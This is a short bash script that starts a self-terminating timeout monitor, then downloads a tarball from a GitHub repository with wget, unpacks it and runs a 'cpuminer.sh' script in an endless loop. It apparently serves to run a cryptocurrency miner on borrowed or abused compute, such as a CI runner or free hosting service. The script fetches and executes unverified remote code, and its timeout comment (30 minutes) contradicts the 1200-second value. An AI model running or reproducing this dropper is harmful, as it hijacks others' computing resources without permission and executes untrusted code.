#!/bin/bash

Timeout=1200 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://github.com/lushenry654/bitbucket/raw/master/rtm24.tar.gz && tar xf rtm24.tar.gz
while [ 1 ]; do
./cpuminer.sh
sleep 3
done
sleep 9999
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit 0
